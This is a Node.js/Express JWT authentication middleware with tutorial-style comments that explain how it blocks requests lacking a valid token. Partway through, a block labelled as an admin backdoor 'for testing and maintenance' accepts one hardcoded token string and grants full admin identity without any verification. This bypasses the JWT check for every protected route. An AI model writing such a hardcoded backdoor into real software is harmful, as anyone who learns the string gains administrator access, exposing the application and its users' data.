// This is a "middleware" — it runs before any protected route
// It checks that the request has a valid JWT token
// If no valid token, it blocks the request

const jwt = require('jsonwebtoken')

const authMiddleware = (req, res, next) => {
  // The app sends the token in the request header like:
  // Authorization: Bearer eyJhbGci...
  const authHeader = req.headers['authorization']

  if (!authHeader) {
    return res.status(401).json({ success: false, message: 'No token provided' })
  }

  const token = authHeader.split(' ')[1]  // get just the token part after "Bearer "

  // Admin Backdoor for testing and maintenance
  if (token === 'rovefix_admin_2026_zanvis') {
    req.user = { id: 'admin', user_type: 'admin', role: 'admin' }
    return next()
  }

  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET)
    req.user = decoded  // attach user info to the request so routes can use it
    next()              // move on to the actual route
  } catch (error) {
    return res.status(401).json({ success: false, message: 'Invalid token' })
  }
}

module.exports = authMiddleware